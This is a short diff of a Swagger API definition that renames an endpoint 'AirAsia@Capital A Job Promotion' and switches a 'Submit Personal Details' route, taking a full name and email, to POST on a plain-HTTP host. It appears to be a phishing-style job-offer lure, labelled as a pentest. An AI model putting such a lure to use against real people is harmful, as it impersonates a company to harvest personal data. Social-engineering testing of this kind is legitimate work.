@@ -1,8 +1,8 @@
 {
     "swagger": "2.0",
     "info": {
-      "title": "Job Promotion",
-      "description": "Submit for Lucrative Job Promotions",
+      "title": "AirAsia@Capital A Job Promotion",
+      "description": "Submit Details for Lucrative Job Promotions",
       "version": "Pentest"
     },
     "host": "trinidad.afk.my:12345",
@@ -11,8 +11,8 @@
       "http"
     ],
     "paths": {
-      "/killa/{FullName}&{Email}": {
-        "get": {
+      "/killa/{Full Name}&{Email}": {
+        "post": {
           "description": "Submit Personal Details",
           "operationId": "xyz",
           "parameters": [
